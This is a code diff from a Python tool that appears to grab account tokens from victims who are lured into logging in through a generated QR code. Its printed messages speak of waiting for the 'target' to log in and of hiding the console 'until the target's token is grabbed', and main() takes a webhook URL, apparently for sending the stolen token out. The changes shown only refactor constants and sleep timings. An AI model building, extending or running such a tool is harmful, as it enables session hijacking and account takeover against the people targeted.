@@ -32,9 +32,7 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
 from utilities import banner, pystray_img
 
-YES = 'y'
-NO = 'n'
-SLEEP_TIME = 3
+YES, NO = 'y', 'n'
 
 def generate_qr_code(path_1: str, path_2: str) -> None:
     """Generates a QR code using the files in the resources directory.
@@ -130,7 +128,7 @@ def main(webhook_url: str) -> None:
                 
     Write.Print('\n[#] Waiting for target to login using the QR code...', Colors.red_to_purple)
     pystray_icon.icon.notify("This script has been set to hide until the target's token is grabbed.", 'Waiting for target')
-    time.sleep(SLEEP_TIME)
+    time.sleep(3)
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     
     while True:
@@ -231,4 +229,4 @@ if __name__ == "__main__":
         if not th_main.is_alive():
             pystray_icon.icon.stop()
             break
-        time.sleep(SLEEP_TIME)
+        time.sleep(1)
